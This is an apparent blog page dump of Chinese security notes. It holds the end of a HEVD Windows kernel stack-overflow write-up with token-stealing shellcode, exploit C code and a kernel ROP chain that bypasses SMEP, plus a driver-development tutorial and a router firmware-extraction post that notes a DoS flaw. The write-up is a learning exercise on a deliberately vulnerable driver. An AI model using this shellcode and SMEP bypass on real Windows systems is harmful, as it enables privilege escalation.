*(DWORD*)((char*)shellcode + 27) = pi.dwProcessId; DeviceIoControl(hDevice, ioctl, stackspace, size, NULL, 0, &amp;info, NULL); printf(&quot;info: %d\\n&quot;, info); std::cout &lt;&lt; &quot;IO Complete\\n&quot;;&#125; 然后到ret返回，查看返回地址 1k 发现返回地地址已经被覆盖了，继续走下去 跳转到了shellcode了，再走两步 ？？？ 说我在执行不可执行的内存，但是明明已经VirtualProtect(shellcode, 256, PAGE_EXECUTE_READWRITE, &amp;oldProtect); ？？？越来越离谱了 尝试把shellcode移动到常量内存中试试，还是不行，接着我再进行ioctl之前pause一下，好像可以了 但是依然被说执行不可执行代码 新的保护机制 查了其他的解法，发现Windows 8过后微软添加了一个叫做SMEP保护的东西 你可以在这里查到关于Windows的所有保护机制：https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10 监督器模式执行防护 (SMEP) ：帮助防止内核 (“监督器”) 在用户页面中执行代码，这是攻击者用于本地内核提升特权 (EOP) 的常见技术。 此配置需要在 Intel Ivy Bridge 或更高版本处理器中找到处理器支持，或者具有 PXN 支持的 ARM。 尝试关闭该保护后执行exp，但是发现是无法关闭的，由于内核的整体设计导致该保护在windows8及以上是不能被关闭的，那么就只能想办法绕过了 A. SMEP保护机制及手动绕过 该保护机制强烈依赖于CPU的RC4寄存器，刚好我这里有《英特尔® 64 位和 IA-32 架构开发人员手册合订本》，翻出来看一下 [机翻]从用户模式地址获取指令。 访问权限取决于 CR4.SMEP 的值： • 如果CR4.SMEP = 0，访问权限取决于分页模式和IA32_EFER.NXE 的值： — 对于 32 位分页或如果 IA32_EFER.NXE = 0，则可以从任何用户模式获取指令 地址。 — 对于 IA32_EFER.NXE = 1 的其他分页模式，可以通过每个分页结构条目中 XD 标志为 0 的转换从任何用户模式地址获取指令 控制翻译； 指令可能无法从任何用户模式地址获取 在任何控制转换的分页结构条目中 XD 标志为 1 的转换。 • 如果CR4.SMEP = 1，则不能从任何用户模式地址获取指令。 — 仅允许对管理员模式影子堆栈地址进行管理员模式影子堆栈访问 （往上看）。 或许我们将CR4.SMEP的值设置为0，访问权限由页中的U/S标志位决定 CR4寄存器的结构如下（小端序顺序从右向左）： 不急，继续搜索发现了一份Intel关于SMEP的更详细的描述 文档：https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf 尝试使用调试起修改CR4 如果修改第20位为0，rc的值为0x270678，然而还是不行 B. KVAS Windows内核缓解机制使用了Kva Shadow内存，比如MeltDown漏洞就于此有关，首先不会讲细节，在下一篇文章会讲到，尝试将其关闭 再注册表HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management 创建两个DWORD值：FeatureSettingsOverride FeatureSettingsOverrideMask 设置值为3，然后重启 现在手动设置cr4.SMEP为0 终于运行了 shellcode的一些偏移有问题 更换为 12345678910111213141516171819202122232425262728BYTE cmd[256] = &#123; 0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc1, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x50, 0xf8, 0x49, 0x89, 0xc0, 0x48, 0x8b, 0x00, 0x48, 0x83, 0xfa, 0x04, 0x75, 0xf0, 0x49, 0x8b, 0x50, 0x70, 0x48, 0x83, 0xe2, 0xf8, 0x49, 0x8b, 0x89, 0xb8, 0x04, 0x00, 0x00, 0x48, 0x83, 0xe1, 0x07, 0x48, 0x01, 0xca, 0x49, 0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff&#125;; EXP 123456789101112131415161718192021222324252627282930void StackOverflow(HANDLE hDevice, unsigned int ioctl) &#123; char stackspace[0x1000] = &#123; 0 &#125;; DWORD oldProtect; printf(&quot;[*] Start Exploit\\n&quot;); LPVOID shellcode_addr = VirtualAlloc(NULL, sizeof(cmd), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(shellcode_addr, cmd, sizeof(cmd)); unsigned int size = 0x820; RtlFillMemory(stackspace, 0x810, &#x27;A&#x27;); *(unsigned long long*)(stackspace + 0x818) = (unsigned long long)shellcode_addr; DWORD info = 0; printf(&quot;shellcode space %p\\n&quot;, shellcode_addr); printf(&quot;[*] Spawning a new cmd.exe process\\n&quot;); system(&quot;pause&quot;); DeviceIoControl(hDevice, ioctl, stackspace, size, NULL, 0, &amp;info, NULL); printf(&quot;info: %d\\n&quot;, info); system(&quot;cmd.exe&quot;);&#125; 调试中手动CR4.SMEP=0（注意，之前已经关闭了KVA） C. 使用内核ROP绕过SMEP 首先我们需要一个类似于mov rc4,xxx的rop，让rc4.smep=0， 参考在Linux下进行ROP的经验， payload大致长这样的 1234*(unsigned long long*)(stackspace + 0x818) = (unsigned long long)pop_rcx_ret;*(unsigned long long*)(stackspace + 0x820) = (unsigned long long)0x00000000002506f8; //set RCX = currentRC4*(unsigned long long*)(stackspace + 0x828) = (unsigned long long)mov_rc4_rcx_ret;*(unsigned long long*)(stackspace + 0x830) = (unsigned long long)shellcode_addr; 多调试或者编程自动寻找就可以找到了，这里暂时参考HEVD Exploits – Windows 10 x64 Stack Overflow SMEP Bypass 修改EXP 1234567unsigned int size = 0x840;RtlFillMemory(stackspace, 0x810, &#x27;A&#x27;);*(unsigned long long*)(stackspace + 0x818) = (unsigned long long)0xfffff807743f52c0;*(unsigned long long*)(stackspace + 0x820) = (unsigned long long)0x00000000002506f8; //set RCX = currentRC4*(unsigned long long*)(stackspace + 0x828) = (unsigned long long)0xfffff807749a41cf;*(unsigned long long*)(stackspace + 0x830) = (unsigned long long)shellcode_addr;printf(&quot;[*] Start set ROP\\n&quot;); 没有下断点直接过 遗留 下一篇 user编程寻找ROPGadget shellcode编写 Token提权 KVAS 参考 https://www.bilibili.com/video/BV1pD4y1a7hP/ https://www.cnblogs.com/XiuzhuKirakira/p/16995784.html https://blog.xpnsec.com/hevd-stack-overflow https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10 https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/ https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf https://wumb0.in/windows-10-kvas-and-software-smep.html https://github.com/xct/windows-kernel-exploits/","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"}]},{"title":"【Win Pwn】HEVD-内核栈溢出(上)","slug":"win-hevd-exp-stackoverflow-I","date":"2024-01-25T07:07:29.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2024/01/25/win-hevd-exp-stackoverflow-I/","link":"","permalink":"https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/","excerpt":"开始做HEVD来熟悉windows的内核漏洞利用方式时，发现大多数的资料依旧基于windows7，但是目前主流的操作系统已经是win10，所以还是得更上时代潮流的 文章已在先知社区投稿：https://xz.aliyun.com/t/13363","text":"开始做HEVD来熟悉windows的内核漏洞利用方式时，发现大多数的资料依旧基于windows7，但是目前主流的操作系统已经是win10，所以还是得更上时代潮流的 文章已在先知社区投稿：https://xz.aliyun.com/t/13363 0. 前置环境 更基础 WIndows10 Vmware虚拟机 Visual Studio 2019，有WDK Windbg Preview（我用单纯是觉得更好看） 最重要的HEVD项目：https://github.com/hacksysteam/HackSysExtremeVulnerableDriver，我直接下载的3.00 Release版 我使用的Windows版本是 I. 编程环境 如果你想快速搭建一个驱动开发环境可以参考B站上的一些资料，如：配置驱动开发环境 如果按照步骤vs没有KernelModDriver这一模板，找到vs目录的WDK.vsix双击即可 一段驱动的主要代码，在main.cpp中编写 123456789101112131415161718192021#include &lt;ntifs.h&gt;#include &quot;win10.h&quot;#include &quot;x64.h&quot;VOIDDriverUnload(PDRIVER_OBJECT DriverObject)&#123; UNREFERENCED_PARAMETER(DriverObject); DbgPrint(&quot;Driver Stopping -&gt; %wZ\\n&quot;, &amp;DriverObject-&gt;DriverName);&#125;NTSTATUSDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)&#123; UNREFERENCED_PARAMETER(RegistryPath); DbgPrint(&quot;Driver Running -&gt; %wZ\\n&quot;, &amp;DriverObject-&gt;DriverName); DriverObject-&gt;DriverUnload = DriverUnload; return STATUS_SUCCESS;&#125; 规定了驱动加载和卸载的两个函数，并在加载和卸载时打印调试信息 II. 调试环境 传统串口调试 添加串口 在虚拟机中Win+R召唤msconfig，打开允许串口调试 然后在（记得用管理员打开）windbg中按照图中配置即可，其他选项不变 一直找不到管道的话可以点Break再等会儿就有了 VirtualKD法调试 项目链接：http://virtualkd.sysprogs.org/ 安装后，vmmon64.exe就行了 但是用了就不能用串口调试了 打开信息显示+DbgView 在\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\注册表中添加Debug Print Filter，并设置一个Default的DWORD值，你可以将其设置为0x8或者允许更多调试信息的0xf 虽然说windbg确实能打印出DbgPrint，但是HEVD使用的是DbgPrintEx，接受不到，安装了DbgView后，他会把调试信息打印出了并且windbg也能收到 调试指令 如果出现了以下情况且虚拟机卡顿，可以使用这两个指令关闭输出 121: kd&gt; ed nt!Kd_SXS_Mask 01: kd&gt; ed nt!Kd_FUSION_Mask 0 关闭这两个函数的输出，莫名其妙变卡的话再用一下 III. 驱动加载 使用KmdManager.exe，毛子的黑科技，使用时需要管理员启动 也可以使用osLoader啥的 这里用KmdKit的KmdManager演示，运行HEVD 那么就算搭建成功 A. 编程基础 关于内核模式驱动程序：https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/ 内核中交互是通过IRP请求进行交互的 IRP 结构是表示 I/O 请求数据包的部分不透明结构。 IRP 结构的未记录成员是保留的，仅由 I/O 管理器使用，在某些情况下，由文件系统驱动程序 (FSD) 使用。 MSDN：https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp 使用到的内存堆栈为I/O Stack I/O 管理器为分层驱动程序链中的每个驱动程序提供其设置的每个 IRP 的 I/O 堆栈位置。 每个 I/O 堆栈位置都包含 一个IO_STACK_LOCATION结构。 MSDN：https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/i-o-stack-locations IRP通过iostack发送给设备，对应的是应用层的“消息”。设备可以存在（硬盘等），也可以不存在（QQ Protect驱动等）。 根据上图，应用层通过和设备对象（FDO）进行交互，设备（PDO）再和设备对象交互，实现交互。同时FDO向PDO的交互不是必要的。 HAL 硬件抽象层 HAL通常是一个独立的动态链接库，windows自身携带多种HAL，但是在系统安装的时候只会选择一种，名为hal.dll。涉及中断控制器、单处理器/多处理器硬件断点。 B. 代码 创建设备 MSDN：https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/device-tree 使用DeviceTree，可以找到：https://web.archive.org/web/20200519214156/http://www.osronline.com/OsrDown.cfm/devicetree_v230.zip 12345678UNICODE_STRING DeviceName = &#123; 0 &#125;; //设备名PDEVICE_OBJECT pDevice = NULL; //设备对象RtlInitUnicodeString(&amp;DeviceName, DEVICE_NAME);Status = IoCreateDevice(DriverObject, 0, &amp;DeviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &amp;pDevice);if (!NT_SUCCESS(Status)) &#123; DbgPrint(&quot;Create Device Failed: %x\\n&quot;, Status); return Status;&#125; 创建符号链接 符号链接就是类似与Z:\\之前的前缀 使用WinObj可以看到，我用的再第一章中下载的KdmKie中的SymLinks（太老了，建议换一个） 12345678UNICODE_STRING SymLink = &#123; 0 &#125;;RtlInitUnicodeString(&amp;SymLink, SYM_NAME);Status = IoCreateSymbolicLink(&amp;SymLink, &amp;DeviceName);if (!NT_SUCCESS(Status)) &#123; DbgPrint(&quot;Create Symbol Link Failed: %x\\n&quot;, Status); IoDeleteDevice(pDevice); return Status;&#125; 关联功能的交互 I. 创建“句柄” MSDN：https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/minidrivers-and-driver-pairs 具体调试方法也在上面的文档中 每个内核模式驱动程序都必须实现名为 DriverEntry 的函数，该函数在加载驱动程序之后会立即得到调用。 DriverEntry 函数使用指向驱动程序实现的一些其他函数的指针来填充 DRIVER_OBJECT 结构的某些成员。 例如，DriverEntry 函数使用指向驱动程序的 Unload 函数的指针来填充 DRIVER_OBJECT 结构的 Unload 成员 1DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = MyCreate; 根据上面的文档，创建的函数和主函数Entry差不多，这里用的是设备对象，不是驱动对象 123456789NTSTATUS MyCreate(PDEVICE_OBJECT pdevice, PIRP pIrp) &#123; NTSTATUS RET = STATUS_SUCCESS; DbgPrint(&quot;My Device Has Opened\\n&quot;); pIrp-&gt;IoStatus.Status = RET; pIrp-&gt;IoStatus.Information = 0; IoCompleteRequest(pIrp, IO_NO_INCREMENT); return RET;&#125; II. 关闭“句柄” 12DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = MyClose;DriverObject-&gt;MajorFunction[IRP_MJ_CLEANUP] = MyClean; 12345678910111213141516171819NTSTATUSMyClose(PDEVICE_OBJECT pdevice, PIRP pIrp) &#123; NTSTATUS RET = STATUS_SUCCESS; DbgPrint(&quot;My Device Has Closed\\n&quot;); pIrp-&gt;IoStatus.Status = RET; pIrp-&gt;IoStatus.Information = 0; IoCompleteRequest(pIrp, IO_NO_INCREMENT); return RET;&#125;NTSTATUSMyClean(PDEVICE_OBJECT pdevice, PIRP pIrp) &#123; NTSTATUS RET = STATUS_SUCCESS; DbgPrint(&quot;My Device Has Clean\\n&quot;); pIrp-&gt;IoStatus.Status = RET; pIrp-&gt;IoStatus.Information = 0; IoCompleteRequest(pIrp, IO_NO_INCREMENT); return RET;&#125; 成功加载 III. 在Ring3进行交互 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;windows.h&gt;int main()&#123; HANDLE hDevice = NULL; hDevice = CreateFileW(L&quot;\\\\\\\\.\\\\My1DeviceLinker&quot;, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hDevice== INVALID_HANDLE_VALUE) &#123; std::cout &lt;&lt; &quot;Error Create File\\n&quot;; system(&quot;pause&quot;); return 0; &#125; std::cout &lt;&lt; &quot;Success open\\n&quot;; system(&quot;pause&quot;); CloseHandle(hDevice); std::cout &lt;&lt; &quot;Success close\\n&quot;; system(&quot;pause&quot;); return 0;&#125; C. 二阶段 MSDN：https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice 关于创建设备的原型 123456789NTSTATUS IoCreateDevice( [in] PDRIVER_OBJECT DriverObject, [in] ULONG DeviceExtensionSize, [in, optional] PUNICODE_STRING DeviceName, [in] DEVICE_TYPE DeviceType, [in] ULONG DeviceCharacteristics, [in] BOOLEAN Exclusive, [out] PDEVICE_OBJECT *DeviceObject); 1[in] DeviceExtensionSize 指定要为 设备对象的设备扩展 分配的驱动程序确定的字节数。 设备扩展的内部结构是驱动程序定义的。 维护设备状态信息。 为驱动程序使用的任何内核定义对象或其他系统资源（如旋转锁）提供存储。 保存驱动程序必须在系统空间中驻留的任何数据，以执行其 I/O 操作。 那么这就是一段描述要传输的数据的空间的大小的值。 从驱动中读取 驱动MyRead函数和DriverEntry 123456789101112131415161718NTSTATUSMyRead(PDEVICE_OBJECT pdevice, PIRP pIrp) &#123; UNREFERENCED_PARAMETER(pdevice); NTSTATUS RET = STATUS_SUCCESS; DbgPrint(&quot;My Device Has Read\\n&quot;); PIO_STACK_LOCATION pStack = IoGetCurrentIrpStackLocation(pIrp); ULONG ReadSize = pStack-&gt;Parameters.Read.Length; PCHAR Buffer = pIrp-&gt;AssociatedIrp.SystemBuffer; DbgPrint(&quot;Ring3 Want Read %x\\n&quot;, ReadSize); RtlCopyMemory(Buffer, &quot;Message From Driver&quot;, strlen(&quot;Message From Driver&quot;)); pIrp-&gt;IoStatus.Status = RET; pIrp-&gt;IoStatus.Information = strlen(&quot;Message From Driver&quot;); IoCompleteRequest(pIrp, IO_NO_INCREMENT); return RET;&#125; R3 12345CHAR Test[0x40] = &#123; 0 &#125;;DWORD lpRead = 0;ReadFile(hDevice, Test, 30, &amp;lpRead, NULL);printf(&quot;%p -%s--%d\\n&quot;, Test, Test,lpRead); 30是要读取的字节 lpRead是真实读取的字节 每向下传递一层需要一个设备栈（可以试着从自己设计这样一个模式的角度想想） SystemBuffer和pIrp-&gt;MdlAddress是同一块物理地址的两个不同虚拟地址（不同的映射）。 需要设置读写方式 12pDevice-&gt;Flags |= DO_BUFFERED_IO;//设备创建成功，绑定符号链接 向驱动中写入 R3 1WriteFile(hDevice, &quot;This is From Ring3.&quot;, strlen(&quot;This is From Ring3.&quot;), &amp;lpRead, NULL); 驱动 1234567891011121314151617181920NTSTATUSMyWrite(PDEVICE_OBJECT pdevice, PIRP pIrp) &#123; UNREFERENCED_PARAMETER(pdevice); NTSTATUS RET = STATUS_SUCCESS; DbgPrint(&quot;My Device Has Wrtitten\\n&quot;); PIO_STACK_LOCATION pStack = IoGetCurrentIrpStackLocation(pIrp); ULONG ReadSize = pStack-&gt;Parameters.Write.Length; PCHAR Buffer = pIrp-&gt;AssociatedIrp.SystemBuffer; DbgPrint(&quot;Ring3 Write Read %x\\n&quot;, ReadSize); RtlZeroMemory(pdevice-&gt;DeviceExtension, 200); RtlCopyMemory(pdevice-&gt;DeviceExtension, Buffer, ReadSize); DbgPrint(&quot;--%p-%s\\n&quot;, Buffer, (PCHAR)pdevice-&gt;DeviceExtension); pIrp-&gt;IoStatus.Status = RET; pIrp-&gt;IoStatus.Information = strlen(&quot;Message From Driver&quot;); IoCompleteRequest(pIrp, IO_NO_INCREMENT); return RET;&#125; [IOCTL]自定义控制IO IRP_MJ_DEVICE_CONTROL，定义IOCTL操作，很多内核的交互大多都是依靠此方式 这里程序接收一个数字返回值x2 驱动 定义操作标识 MSDN：https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code 12#define IOCTL_MUL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x9888, METHOD_BUFFERED, FILE_ANY_ACCESS) 0x9888：标识符号 编写函数 1234567891011121314151617181920212223242526272829303132333435NTSTATUSMyControl(PDEVICE_OBJECT pdevice, PIRP pIrp) &#123; UNREFERENCED_PARAMETER(pdevice); NTSTATUS RET = STATUS_SUCCESS; DbgPrint(&quot;My Device Has IOCTL\\n&quot;); PIO_STACK_LOCATION pStack = IoGetCurrentIrpStackLocation(pIrp); ULONG ioCode = pStack-&gt;Parameters.DeviceIoControl.IoControlCode; //功能码 ULONG inLen = pStack-&gt;Parameters.DeviceIoControl.InputBufferLength; //出入长度 //ULONG outLen = pStack-&gt;Parameters.DeviceIoControl.OutputBufferLength; //输出长度 ULONG ioInfo = 0; switch (ioCode) &#123; case IOCTL_MUL: &#123; DWORDLONG inData = *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer; //取出传输的数据 DbgPrint(&quot;Kernel Recive: %d, Len: %lld\\n&quot;, inData, inLen); inData *= 2; DbgPrint(&quot;Kernel Data %d\\n&quot;, inData); *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer = inData; //写回操作 ioInfo = 4; break; &#125; default: RET = STATUS_UNSUCCESSFUL; ioInfo = 0; break; &#125; pIrp-&gt;IoStatus.Status = RET; pIrp-&gt;IoStatus.Information = ioInfo; IoCompleteRequest(pIrp, IO_NO_INCREMENT); return RET;&#125; 一些关键函数 DriverEntry 12345678910111213141516171819202122232425262728293031323334353637383940414243NTSTATUSDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)&#123; UNREFERENCED_PARAMETER(RegistryPath); NTSTATUS Status = STATUS_SUCCESS; DbgPrint(&quot;Driver Running -&gt; %wZ\\n&quot;, &amp;DriverObject-&gt;DriverName); DriverObject-&gt;DriverUnload = DriverUnload; //创建设备 UNICODE_STRING DeviceName = &#123; 0 &#125;; //设备名 PDEVICE_OBJECT pDevice = NULL; //设备对象 RtlInitUnicodeString(&amp;DeviceName, DEVICE_NAME); Status = IoCreateDevice(DriverObject, 0x200, &amp;DeviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &amp;pDevice); if (!NT_SUCCESS(Status)) &#123; DbgPrint(&quot;Create Device Failed: %x\\n&quot;, Status); return Status; &#125; pDevice-&gt;Flags |= DO_BUFFERED_IO; //设备创建成功，绑定符号链接 UNICODE_STRING SymLink = &#123; 0 &#125;; RtlInitUnicodeString(&amp;SymLink, SYM_NAME); Status = IoCreateSymbolicLink(&amp;SymLink, &amp;DeviceName); if (!NT_SUCCESS(Status)) &#123; DbgPrint(&quot;Create Symbol Link Failed: %x\\n&quot;, Status); IoDeleteDevice(pDevice); return Status; &#125; DbgPrint(&quot;Device &amp; Symbolic Link Created\\n&quot;); DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = MyCreate; DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = MyClose; DriverObject-&gt;MajorFunction[IRP_MJ_CLEANUP] = MyClean; DriverObject-&gt;MajorFunction[IRP_MJ_READ] = MyRead; DriverObject-&gt;MajorFunction[IRP_MJ_WRITE] = MyWrite; DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyControl; DbgPrint(&quot;Function Settal Done\\n&quot;); return Status;&#125; DriverUnload 1234567891011121314VOIDDriverUnload(PDRIVER_OBJECT DriverObject)&#123; UNREFERENCED_PARAMETER(DriverObject); DbgPrint(&quot;Driver Stopping -&gt; %wZ\\n&quot;, &amp;DriverObject-&gt;DriverName); DbgPrint(&quot;Device Stopping\\n&quot;); if (DriverObject-&gt;DeviceObject) &#123; IoDeleteDevice(DriverObject-&gt;DeviceObject); UNICODE_STRING symname = &#123; 0 &#125;; RtlInitUnicodeString(&amp;symname, SYM_NAME); IoDeleteSymbolicLink(&amp;symname); &#125;&#125; 用于在Ring3交互的项目的主函数 1234567891011121314151617181920212223242526272829// R3Control.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;windows.h&gt;#define IOCTL_MUL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x9888, METHOD_BUFFERED, FILE_ANY_ACCESS)int main()&#123; HANDLE hDevice = NULL; hDevice = CreateFileW(L&quot;\\\\\\\\.\\\\My1DeviceLinker&quot;, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hDevice== INVALID_HANDLE_VALUE) &#123; std::cout &lt;&lt; &quot;Error Create File\\n&quot;; return 0; &#125; std::cout &lt;&lt; &quot;Success open\\n&quot;; system(&quot;pause&quot;); std::cout &lt;&lt; &quot;now IOCTL\\n&quot;; DWORDLONG a = 64; DWORDLONG b = 0; DWORD info = 0; DeviceIoControl(hDevice, IOCTL_MUL, &amp;a, sizeof(DWORDLONG), &amp;b, sizeof(DWORDLONG), &amp;info, NULL); printf(&quot;value a: %lld, b: %lld\\nreal info %d\\n&quot;, a, b, info); CloseHandle(hDevice); std::cout &lt;&lt; &quot;Success close\\n&quot;; return 0;&#125; 参考 https://www.bilibili.com/video/BV1QJ411A7kR https://space.bilibili.com/1992190180/ https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/xianzh","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"}]},{"title":"【漏洞挖掘】记一次痛苦的VxWorks路由器漏洞挖掘","slug":"MW300R-vuln","date":"2024-01-12T06:41:03.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2024/01/12/MW300R-vuln/","link":"","permalink":"https://joe1sn.eu.org/2024/01/12/MW300R-vuln/","excerpt":"问题多又多","text":"问题多又多 记一次痛苦的VxWorks路由器漏洞挖掘 路由器很老了，是Mercury MW300R的某个版本，网上找不到固件，所以最开始想用uart进shell 拆开过后可以快速找到UART引脚 UART调试 I 打开UART 路由器断电，然后把万用表调到测接地，黑笔随便找一个电路板上的接口（我用的wifi天线的），红笔测口子，响的那个就是接地 接着路由器连上电源，万用表调到测电压，黑笔随便找一个电路板上的接口，红笔挨个测试接口 如果为3.3V左右，那么是电源线（3.3V） 如果为0V，为接地（GND） 如果为2.5V左右，为TXD（路由器的Write） 如果不断跳动，为RXD（路由器的Read） 然后第一点不寻常的就来了 我在测试的时候只能通过排除法筛选出了RXD，我的RXD一直为0V 这个时候通过 1234FT232: 3.3V -&gt; 路由器: 3.3vFT232: GND -&gt; 路由器: GNDFT232: RXD -&gt; 路由器: TXDFT232: TXD -&gt; 路由器: RXD 插上路由器电源线，但是不插插头，通过串口就能连上了 但是会发现无法输入，导致设备一直重启，在这个地方无法停下autoboot，很显然需要输入来打断 但是路由器的RXD一直为0V，说明并没有开启向路由器写入的功能，通过仔细观察电路，发现RXD出口有下面几个接口，不断测试发现RXD可以在下方的焊点使用 但是我没有架子，而且焊点太小了（本人电烙铁太菜），所以折弯了一根曲别针来传信号 II 开始调试 A 能用的功能特别少，而且tftp功能用不了，不过md可以查看内存 其实这里可以参考这篇博客进行dump提取的，但是当时没想到。 III 开始调试 B 在进入uboot的时候发现ctrl+C会打断一个TP-Link的shell 后续发现插上插头后有概率会停在这里 使用命令查看内存分配 1flash -layout 看到这里我才明白最开始进的是uboot的控制窗口，这里才是真正的Flash存储的启动点 修改了这篇博客的脚本按照一样的思路试图提取固件出来，但是binwalk没有任何识别，所以UART走到尽头了 CHA341A法 就是传统的飞线法，路由器上能用芯片夹的就两个芯片，用CHA341编程器读取一下就知道了（记得装驱动） 关于组装可以看这篇 芯片没有识别到，但是重要的是芯片存储的大小，通过上flash layout可以看到总空间大小是1024KB=1MB，选择大小为1MB的芯片就好了 用binwalk看一下，发现是VxWorks的系统，而且根本就没有Unix/Linux的文件系统，而是使用了Wind River 文件系统，怪不得所有东西都是一坨，而且知道了程序入口是0x80001000 可以参考这篇来慢慢提取，不过也可以直接 1binwalk -Me MW300R.bin 看上去挺多的，其实根本不慌，随便看一个 再看看Wind River那段的数据，按顺序就对对应的不同文件了 可以按照对应的格式写脚本提取，不过本文的中心并不在这儿。 在提取的时候发现 把49200文件特殊看一下 恭喜，找到了主要文件的 用ida 32位 MIPS大端序打开 根据前文提到的入口地址0x80001000设置入口 在开头按下C就IDA就开始自动分析了 漏洞挖掘 上面的二进制分析起来还是有难度的，不过用常规思路（包括web）即可 比如一个很明显的DOS洞，很明显只做了前端校验 直接把路由器打崩，得重启才能恢复正常工作 引用 https://paper.seebug.org/2024 https://e3pem.github.io/2019/07/03/IoT/提取tl-wdr5620固件/ 